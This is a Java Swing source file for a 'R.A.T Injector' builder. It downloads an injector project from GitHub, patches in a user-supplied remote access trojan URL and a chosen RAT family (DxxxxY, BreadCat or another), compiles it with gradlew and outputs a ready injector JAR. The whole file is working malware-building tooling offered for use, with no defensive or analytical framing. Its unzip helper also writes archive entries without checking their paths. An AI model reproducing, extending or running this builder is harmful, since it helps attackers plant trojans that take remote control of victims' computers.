import javax.swing.*;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.BufferedOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.nio.file.StandardOpenOption;
import java.util.zip.ZipEntry;
import java.util.zip.ZipInputStream;
import java.net.URI;
import org.apache.commons.io.FileUtils;



public class Main implements ActionListener {
    JTextField FileText; 
    JTextField OtherFolder; 
    
    public static File path = new File(System.getenv("APPDATA") + "\\Injector");

    public Main() {
        // GUI shit
        JFrame frame = new JFrame();
        JPanel panel = new JPanel();
        panel.setLayout(null);
    
        frame.setTitle("Injector Builder by @Legacy");

        JLabel label = new JLabel("R.A.T URL:");
        label.setBounds(172, 10, 150, 25);
    
        FileText = new JTextField(20); 
        FileText.setBounds(65, 35, 250, 25);

        JLabel FolderText = new JLabel("R.A.T Folder name if not listed:");
        FolderText.setBounds(100, 75, 200, 25);

        OtherFolder = new JTextField(20); 
        OtherFolder.setBounds(65, 100, 250, 25);
    
        JButton DxxxxY = new JButton("DxxxxY R.A.T");
        DxxxxY.setBounds(30, 300, 150, 25);
        DxxxxY.addActionListener(this);
    
        JButton BreadCat = new JButton("BreadCat R.A.T");
        BreadCat.setBounds(205, 300, 150, 25);
        BreadCat.addActionListener(this);

        JButton Other = new JButton("Other R.A.T");
        Other.setBounds(120, 250, 150, 25);
        Other.addActionListener(this);
        
        panel.add(label);
        panel.add(FileText);
        
        panel.add(FolderText);
        panel.add(OtherFolder);

        panel.add(Other);
        panel.add(DxxxxY);
        panel.add(BreadCat);
    
        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        frame.pack();
        frame.add(panel, BorderLayout.CENTER);
        frame.setVisible(true);
    
        frame.setSize(400, 400);
        frame.setLocationRelativeTo(null);
      }

    public static void main(String[] args) {
        new Main();
    }

    @Override
    public void actionPerformed(ActionEvent e) {
        if (e.getActionCommand().equals("Other R.A.T")) {
            try {
                System.out.println("Other R.A.T");
                // creates folder
                path.mkdir();
                File folder = new File(path + "\\R.A.T-Injector");
                folder.mkdir();
                // downloads Injector
                FileUtils.copyURLToFile(new URI("https://github.com/TheOneLegacy/R.A.T-Injector/archive/refs/heads/main.zip").toURL(), new File(path + "\\R.A.T-Injector.zip"));
                
                String zipFilePath = path + "\\R.A.T-Injector.zip";
                String destDirectory = "" + path;
                // unzip the zip file
                unzip(zipFilePath, destDirectory);
                Thread.sleep(2000);
                // deletes zip file
                File zipfile = new File(path + "\\R.A.T-Injector.zip");
                zipfile.delete();
                
                File newfile = new File(path + "\\R.A.T-Injector-main");
                newfile.renameTo(new File(path + "\\R.A.T-Injector"));

                String otherfolder = OtherFolder.getText();

                // changes rat used
                String file = path + "\\R.A.T-Injector\\src\\main\\java\\legacy\\dev\\Main.java";
                String line = "String foldername = \"\";";
                String newLine = "String foldername = \"" + otherfolder + "\";";
                
                String content = new String(Files.readAllBytes(Paths.get(file)));
                content = content.replaceAll(line, newLine);
                Files.write(Paths.get(file), content.getBytes(), StandardOpenOption.TRUNCATE_EXISTING);

                String fileurl = FileText.getText();
                
                // changes the download url
                String raturl = "String raturl = \"\";";
                String newraturl = "String raturl = \"" + fileurl +"\";";

                String content2 = new String(Files.readAllBytes(Paths.get(file)));
                content2 = content2.replaceAll(raturl, newraturl);
                Files.write(Paths.get(file), content2.getBytes(), StandardOpenOption.TRUNCATE_EXISTING);
                
                // compiles the injector
                String[] command = {"cmd.exe", "/C", "cd " + path + "\\R.A.T-Injector && gradlew shadowJar"};
                Process p = Runtime.getRuntime().exec(command);
                p.waitFor();
                
                System.out.println("Compiled");

                // moves file 
                File oldfile2 = new File(path + "\\R.A.T-Injector\\build\\libs\\InjectorGradle-1.0-SNAPSHOT-all.jar");
                File newfile2 = new File(path + "\\InjectorGradle-1.0-SNAPSHOT-all.jar");
                oldfile2.renameTo(newfile2);

                // rename file
                File oldfile3 = new File(path + "\\InjectorGradle-1.0-SNAPSHOT-all.jar");
                File newfile3 = new File(path + "\\R.A.T-Injector.jar");
                oldfile3.renameTo(newfile3);

                // open folder
                Desktop.getDesktop().open(new File("" + path));
            } catch (Exception ex) {
                ex.printStackTrace();
            }
        }
        if (e.getActionCommand().equals("DxxxxY R.A.T")) {
            try {
                System.out.println("DxxxxY R.A.T");
                // creates folder
                path.mkdir();

                FileUtils.copyURLToFile(new URI("https://github.com/TheOneLegacy/R.A.T-Injector/archive/refs/heads/main.zip").toURL(), new File(path + "\\R.A.T-Injector.zip"));
                
                String zipFilePath = path + "\\R.A.T-Injector.zip";
                String destDirectory = "" + path;
                // unzips file
                unzip(zipFilePath, destDirectory);
                Thread.sleep(2000);
                // deletes zip file
                File zipfile = new File(path + "\\R.A.T-Injector.zip");
                zipfile.delete();
                
                File newfile = new File(path + "\\R.A.T-Injector-main");
                newfile.renameTo(new File(path + "\\R-A.T-Injector"));

                // replaces rat used
                String file = path + "\\R.A.T-Injector\\src\\main\\java\\legacy\\dev\\Main.java";
                String line = "Boolean DxxxxY = false;";
                String newLine = "Boolean DxxxxY = true;";
                
                String content = new String(Files.readAllBytes(Paths.get(file)));
                content = content.replaceAll(line, newLine);
                Files.write(Paths.get(file), content.getBytes(), StandardOpenOption.TRUNCATE_EXISTING);

                String fileurl = FileText.getText();
                
                String raturl = "String raturl = \"\";";
                String newraturl = "String raturl = \"" + fileurl +"\";";
                // replaces the download url
                String content2 = new String(Files.readAllBytes(Paths.get(file)));
                content2 = content2.replaceAll(raturl, newraturl);
                Files.write(Paths.get(file), content2.getBytes(), StandardOpenOption.TRUNCATE_EXISTING);
                // compiles the injector
                String[] command = {"cmd.exe", "/C", "cd " + path + "\\R.A.T-Injector && gradlew shadowJar"};
                Process p = Runtime.getRuntime().exec(command);
                p.waitFor();

                // moves file 
                File oldfile2 = new File(path + "\\R.A.T-Injector\\build\\libs\\InjectorGradle-1.0-SNAPSHOT-all.jar");
                File newfile2 = new File(path + "\\InjectorGradle-1.0-SNAPSHOT-all.jar");
                oldfile2.renameTo(newfile2);

                // rename file
                File oldfile3 = new File(path + "\\InjectorGradle-1.0-SNAPSHOT-all.jar");
                File newfile3 = new File(path + "\\R.A.T-Injector.jar");
                oldfile3.renameTo(newfile3);

                // open folder
                Desktop.getDesktop().open(new File("" + path));
                System.out.println("Compiled");
            } catch (Exception ex) {
                ex.printStackTrace();
            }
        }
        if (e.getActionCommand().equals("BreadCat R.A.T")) {
            try {
                System.out.println("BreadCat R.A.T");
                // creates the folder
                path.mkdir();
                File folder = new File(path + "\\R.A.T-Injector");
                folder.mkdir();

                // downloads the rat
                FileUtils.copyURLToFile(new URI("https://github.com/TheOneLegacy/R.A.T-Injector/archive/refs/heads/main.zip").toURL(), new File(path + "\\R.A.T-Injector.zip"));
                
                String zipFilePath = path + "\\R.A.T-Injector.zip";
                String destDirectory = "" + path;

                // unzips the rat
                unzip(zipFilePath, destDirectory);
                Thread.sleep(2000);
                File zipfile = new File(path + "\\R.A.T-Injector.zip");
                zipfile.delete();

                // removes old files
                File oldfile = new File(path + "\\R.A.T-Injector");
                FileUtils.deleteDirectory(oldfile);
                
                File newfile = new File(path + "\\R.A.T-Injector-main");
                newfile.renameTo(new File(path + "\\R.A.T-Injector"));

                // replaces the rat that it uses
                String file = path + "\\R.A.T-Injector\\src\\main\\java\\legacy\\dev\\Main.java";
                String line = "Boolean Breadcat = false;";
                String newLine = "Boolean Breadcat = true;";
                
                String content = new String(Files.readAllBytes(Paths.get(file)));
                content = content.replaceAll(line, newLine);
                Files.write(Paths.get(file), content.getBytes(), StandardOpenOption.TRUNCATE_EXISTING);

                String fileurl = FileText.getText();
                // replaces the download link
                String raturl = "String raturl = \"\";";
                String newraturl = "String raturl = \"" + fileurl +"\";";

                String content2 = new String(Files.readAllBytes(Paths.get(file)));
                content2 = content2.replaceAll(raturl, newraturl);
                Files.write(Paths.get(file), content2.getBytes(), StandardOpenOption.TRUNCATE_EXISTING);

                // compiles the file
                String[] command = {"cmd.exe", "/C", "cd " + path + "\\R.A.T-Injector && gradlew shadowJar"};
                Process p = Runtime.getRuntime().exec(command);
                p.waitFor();

                System.out.println("Compiled");
                // moves file 
                File oldfile2 = new File(path + "\\R.A.T-Injector\\build\\libs\\InjectorGradle-1.0-SNAPSHOT-all.jar");
                File newfile2 = new File(path + "\\InjectorGradle-1.0-SNAPSHOT-all.jar");
                oldfile2.renameTo(newfile2);

                // rename file
                File oldfile3 = new File(path + "\\InjectorGradle-1.0-SNAPSHOT-all.jar");
                File newfile3 = new File(path + "\\R.A.T-Injector.jar");
                oldfile3.renameTo(newfile3);

                // open folder
                Desktop.getDesktop().open(new File("" + path));
            } catch (Exception ex) {
                ex.printStackTrace();
            }
    }
}
public static void unzip(String zipFilePath, String destDirectory) {
    // unzip function
    FileInputStream fis;
    ZipInputStream zipIs;
    ZipEntry ze;
    try {
        fis = new FileInputStream(zipFilePath);
        zipIs = new ZipInputStream(fis);
        while((ze = zipIs.getNextEntry()) != null) {
            String entryName = ze.getName();
            File f = new File(destDirectory + File.separator + entryName);
            if(ze.isDirectory()) {
                f.mkdirs();
            } else {
                f.getParentFile().mkdirs();
                BufferedOutputStream bos = new BufferedOutputStream(new FileOutputStream(f));
                byte[] bytesIn = new byte[1024];
                int read = 0;
                while((read = zipIs.read(bytesIn)) != -1) {
                    bos.write(bytesIn, 0, read);
                }
                bos.close();
            }
            zipIs.closeEntry();
        }
        zipIs.close();
        fis.close();
    } catch (IOException e) {
    }
}
}

